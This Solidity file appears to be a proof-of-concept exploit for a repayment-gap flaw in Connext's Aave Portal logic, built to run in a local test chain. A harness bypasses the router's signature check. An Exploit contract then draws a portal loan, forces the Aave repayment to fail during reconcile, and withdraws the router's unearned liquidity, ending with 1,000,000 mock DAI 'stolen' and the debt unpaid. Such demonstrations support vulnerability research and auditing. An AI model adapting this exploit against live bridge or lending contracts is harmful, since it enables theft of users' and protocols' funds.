// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

// Real audited Connext facets (unmodified) — the same source the registry test deploys.
import {BridgeFacet} from "../src/connext/core/connext/facets/BridgeFacet.sol";
import {RoutersFacet} from "../src/connext/core/connext/facets/RoutersFacet.sol";
import {PortalFacet} from "../src/connext/core/connext/facets/PortalFacet.sol";
import {TokenRegistry} from "../src/connext/core/connext/helpers/TokenRegistry.sol";
import {ConnextMessage} from "../src/connext/core/connext/libraries/ConnextMessage.sol";
import {AssetLogic} from "../src/connext/core/connext/libraries/AssetLogic.sol";
import {ITokenRegistry} from "../src/connext/core/connext/interfaces/ITokenRegistry.sol";
import {IAavePool} from "../src/connext/core/connext/interfaces/IAavePool.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Opaque adopted/local ERC20 (the token the protocol bridges).
contract MockDai is ERC20 {
  constructor() ERC20("Dai Stablecoin", "DAI") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

/// @dev Minimal REAL Aave Portal boundary. Only the *external* Aave pool interface is a
///      stand-in; all Connext repayment logic runs from the audited source. `backUnbacked`
///      reverts (repayEnabled=false) to exercise the documented repayment-failure branch.
contract MockAavePortal is IAavePool {
  mapping(address => uint256) public unbacked;
  bool public repayEnabled;

  function setRepayEnabled(bool _v) external {
    repayEnabled = _v;
  }

  function mintUnbacked(
    address asset,
    uint256 amount,
    address,
    uint16
  ) external override {
    unbacked[asset] += amount;
  }

  function withdraw(
    address asset,
    uint256 amount,
    address to
  ) external override returns (uint256) {
    IERC20(asset).transfer(to, amount);
    return amount;
  }

  function backUnbacked(
    address asset,
    uint256 amount,
    uint256 fee
  ) external override {
    require(repayEnabled, "AAVE_PORTAL: backUnbacked reverted");
    IERC20(asset).transferFrom(msg.sender, address(this), amount + fee);
    unbacked[asset] -= amount;
  }
}

/// @dev Combines the audited BridgeFacet + RoutersFacet + PortalFacet over one shared
///      diamond AppStorage (slot 0), exactly as they run behind the Connext diamond. The
///      only additions are an access-control-free storage seeder and a `takePortalLoan`
///      wrapper: because the browser EVM cannot produce the router's off-chain ECDSA
///      signature that `execute()` checks, we call the audited internal `_executePortalTransfer`
///      (the loan) directly — the signature is auth, not the bug. The repay-gap
///      (`_reconcile`/`_reconcileProcessPortal`) and the withdrawal run verbatim.
///      This 36KB contract exceeds EIP-170, so it is injected at a fixed address via
///      anvil_state.json rather than CREATE-deployed.
contract ConnextPortalHarness is BridgeFacet, RoutersFacet, PortalFacet {
  function seed(
    address tokenRegistry_,
    address aavePool_,
    address router_,
    address routerOwner_,
    address local_,
    bytes32 canonicalId_
  ) external {
    s.tokenRegistry = ITokenRegistry(tokenRegistry_);
    s.aavePool = aavePool_;
    s.LIQUIDITY_FEE_NUMERATOR = 10000;
    s.LIQUIDITY_FEE_DENOMINATOR = 10000;
    s.aavePortalFeeNumerator = 0;
    s.maxRoutersPerTransfer = 5;
    s.routerPermissionInfo.approvedRouters[router_] = true;
    s.routerPermissionInfo.approvedForPortalRouters[router_] = true;
    s.routerPermissionInfo.routerOwners[router_] = routerOwner_;
    s.canonicalToAdopted[canonicalId_] = local_; // adopted == local => no swap
  }

  /// @notice Draws the Aave Portal loan through the audited `_executePortalTransfer`, records
  ///         the router for reconcile, and pays out to the user (mirrors `execute()`'s portal
  ///         branch + `_handleExecuteTransaction`, minus the ECDSA/whitelist auth).
  function takePortalLoan(
    bytes32 transferId,
    uint256 amount,
    address local,
    address router,
    address to
  ) external {
    s.routedTransfers[transferId].push(router);
    (uint256 userAmount, address adopted) = _executePortalTransfer(transferId, amount, local, router);
    AssetLogic.transferAssetFromContract(adopted, to, userAmount);
  }

  /// @notice Delivers the slow nomad message the way a relayer would (auth wrapper `handle`
  ///         omitted; `_reconcile`/`_reconcileProcessPortal` run verbatim).
  function reconcileExposed(uint32 _origin, bytes memory _message) external {
    _reconcile(_origin, _message);
  }

  function buildTransferMessage(
    uint32 tokenDomain,
    bytes32 tokenId,
    bytes32 to,
    uint256 amount,
    bytes32 detailsHash,
    bytes32 transferId
  ) external view returns (bytes memory) {
    return
      ConnextMessage.formatMessage(
        ConnextMessage.formatTokenId(tokenDomain, tokenId),
        ConnextMessage.formatTransfer(to, amount, detailsHash, transferId)
      );
  }
}

/// @notice Playground entrypoint. Deploys the small supporting contracts, drives the real
///         Connext portal loan -> failed reconcile repayment -> router withdrawal, and ends
///         holding the stolen 1,000,000 DAI while Connext's Aave debt is still outstanding.
contract Exploit {
  // Fixed address the 36KB ConnextPortalHarness runtime is injected at (anvil_state.json).
  ConnextPortalHarness internal constant connext = ConnextPortalHarness(address(0xC0DE));

  uint32 internal constant LOCAL_DOMAIN = 1735353714;
  uint32 internal constant ORIGIN_DOMAIN = 6648936;
  uint256 internal constant AMOUNT = 1_000_000 ether; // 1,000,000 DAI
  address internal constant ROUTER = address(0x2222222222222222222222222222222222222222);
  address internal constant USER = address(0xA71CE);
  bytes32 internal constant TRANSFER_ID = keccak256("connext.portal.h05");

  MockDai public dai;
  TokenRegistry public registry;
  MockAavePortal public aave;
  uint256 public stolen;
  uint256 public outstandingDebt;

  constructor() {
    dai = new MockDai(); // CREATE nonce 1
    registry = new TokenRegistry(); // CREATE nonce 2
    aave = new MockAavePortal(); // CREATE nonce 3

    registry.setLocalDomain(LOCAL_DOMAIN);

    bytes32 canonicalId = bytes32(uint256(uint160(address(dai))));
    connext.seed(address(registry), address(aave), ROUTER, address(this), address(dai), canonicalId);

    dai.mint(address(aave), AMOUNT); // Aave lending reserve
    dai.mint(address(connext), AMOUNT); // canonical-domain escrow custodied in the diamond
    aave.setRepayEnabled(false); // the repayment call will fail at reconcile time
  }

  function run() external {
    bytes32 canonicalId = bytes32(uint256(uint160(address(dai))));

    // 1) Draw the Aave Portal loan for the fast transfer and pay the user.
    connext.takePortalLoan(TRANSFER_ID, AMOUNT, address(dai), ROUTER, USER);

    // 2) Slow message arrives; repayment to Aave fails, so the full amount is credited to
    //    the router and the portal debt is left outstanding (BridgeFacet._reconcileProcessPortal).
    bytes memory message = connext.buildTransferMessage(
      LOCAL_DOMAIN,
      canonicalId,
      bytes32(uint256(uint160(USER))),
      AMOUNT,
      bytes32(0),
      TRANSFER_ID
    );
    connext.reconcileExposed(ORIGIN_DOMAIN, message);

    // 3) Rogue router withdraws all its (unearned) liquidity into the attacker.
    connext.removeRouterLiquidityFor(AMOUNT, address(dai), payable(address(this)), ROUTER);

    stolen = dai.balanceOf(address(this));
    outstandingDebt = connext.getAavePortalDebt(TRANSFER_ID);

    // Harm: router walked away with the full loan while Connext still owes Aave.
    require(stolen == AMOUNT, "router did not extract the loan");
    require(outstandingDebt == AMOUNT, "portal debt should remain unpaid");
  }
}
